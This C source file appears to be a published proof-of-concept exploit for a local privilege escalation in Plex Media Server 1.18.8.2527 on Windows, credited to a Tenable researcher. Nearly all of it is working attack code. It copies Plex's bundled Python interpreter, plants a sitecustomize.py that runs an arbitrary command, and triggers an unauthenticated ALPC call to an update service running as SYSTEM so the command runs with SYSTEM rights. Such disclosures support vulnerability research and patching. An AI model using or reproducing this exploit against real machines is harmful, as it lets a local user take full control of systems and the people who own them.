#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include "RpcClient_h.h"
#include <windows.h>
#include <strsafe.h>

/*
 * Author: Chris Lyne @lynerc
 * https://www.tenable.com/security/research/tra-2020-25
 *
 * Local privilege escalation via an unauth ALPC service running as SYSTEM
 * works against PlexMediaServer-1.18.8.2527-740d4c206-x86.exe
 */

/* useful references:
*
*	https://docs.microsoft.com/en-us/windows/win32/rpc/the-client-application
*	https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf
*
*/
long doAlpcStuff(RPC_WSTR, RPC_WSTR, const wchar_t *);

int main(int argc, char ** argv)
{
	// Copy PlexScriptHost.exe, Python27.dll, and Python27.zip to the current working directory
	// PlexScriptHost is just a Python interpreter

	const int max_cmd = 1000;
	char cmd[max_cmd];
	
	if (argv[1] == NULL)
	{
		printf("No command specified. Defaulting to calc.");
		
		StringCchCopyA(cmd, _countof(cmd), "c:\\windows\\system32\\calc.exe");
	}
	else
	{
		StringCchCopyA(cmd, _countof(cmd), argv[1]);
	}

	const wchar_t * files[3] = {
		L"PlexScriptHost.exe",
		L"Python27.dll",
		L"Python27.zip"
	};

	const wchar_t * installDir = TEXT("C:\\Program Files (x86)\\Plex\\Plex Media Server");
	wchar_t destDir[MAX_PATH] = { 0 };
	GetCurrentDirectory(_countof(destDir), destDir);

	printf("Current dir: %ls\n", destDir);

	wchar_t src[MAX_PATH] = { 0 };
	wchar_t dest[MAX_PATH] = { 0 };
	int ret = 0;
	for (int i = 0; i < _countof(files); i++)
	{
		swprintf(src, _countof(src), L"%ls\\%ls", installDir, files[i]);
		swprintf(dest, _countof(dest), L"%ls\\%ls", destDir, files[i]);
		printf("Copying '%ls' to '%ls'\n", src, dest);
		ret = CopyFile(src, dest, false);	// will overwrite
		if (!ret)
		{
			printf("Error copying files to current directory.");
			return -1;
		}
	}

	// Now create a sitecustomize.py to be executed when PlexScriptHost launches
	HANDLE file;
	char data[max_cmd + 50];
	StringCchPrintfA(data, _countof(data), "import subprocess\nsubprocess.Popen('%s')", cmd);

	swprintf(dest, _countof(dest), L"%ls\\%ls", destDir, L"sitecustomize.py");

	file = CreateFile(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // overwrite

	if (file == INVALID_HANDLE_VALUE)
	{
		printf("Error creating '%ls'\n", dest);
		return -1;
	}

	DWORD numBytes = (DWORD)strlen(data);
	DWORD numBytesWritten = 0;
	printf("Writing %d bytes to '%ls'\n", numBytes, dest);
	BOOL error = WriteFile(file, data, numBytes, &numBytesWritten, NULL);

	if (error == FALSE)
	{
		printf("Error writing to '%ls'\n", dest);
		return -1;
	}
	else
	{
		CloseHandle(file);
	}

	// Finally, let's issue the ALPC request and launch PlexScriptHost.exe

	RPC_WSTR uuid = (RPC_WSTR) L"631c7d9c-1797-42f9-8e96-367a9ee58887";	// from rpcview
	RPC_WSTR endpoint = (RPC_WSTR) L"UpdateServiceEndpoint";	// from rpcview
	wchar_t executable[MAX_PATH] = { 0 };
	swprintf(executable, _countof(executable), L"%ls\\%ls", destDir, L"PlexScriptHost.exe"); // launch PlexScriptHost.exe

	printf("Issuing ALPC call\n");
	long status = doAlpcStuff(uuid, endpoint, executable);
	if (status != 0)
	{
		printf("RPC error encountered. Got a status code of %ld.\n", status);
		return -1;
	}
	else
	{
		printf("No errors encountered.\n");
		return 0;
	}
}

long doAlpcStuff(RPC_WSTR pszUuid, RPC_WSTR pszEndpoint, const wchar_t * pszString)
{
	RPC_STATUS status;
	RPC_WSTR pszProtocolSequence = (RPC_WSTR)L"ncalrpc";	// alpc
	RPC_WSTR pszNetworkAddress = NULL;
	RPC_WSTR pszOptions = NULL;
	RPC_WSTR pszStringBinding = NULL;
	unsigned long ulCode;

	status = RpcStringBindingCompose(pszUuid,
		pszProtocolSequence,
		pszNetworkAddress,
		pszEndpoint,
		pszOptions,
		&pszStringBinding);

	if (status)
		return status;

	status = RpcBindingFromStringBinding((RPC_WSTR)pszStringBinding, &my_IfHandle);

	if (status)
		return status;

	RpcTryExcept
	{
		long out;
		Proc2((wchar_t *)pszString, &out);	// Proc1 is defined in the IDL generated by RpcView
	}
		RpcExcept(1)
	{
		ulCode = RpcExceptionCode();
		printf("Runtime reported exception 0x%lx = %ld\n", ulCode, ulCode);
	}
	RpcEndExcept

	status = RpcStringFree((RPC_WSTR *)&pszStringBinding);

	if (status)
		return status;

	status = RpcBindingFree(&my_IfHandle);

	if (status)
		return status;

	return 0;
}

/******************************************************/
/*         MIDL allocate and free                     */
/******************************************************/

void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}
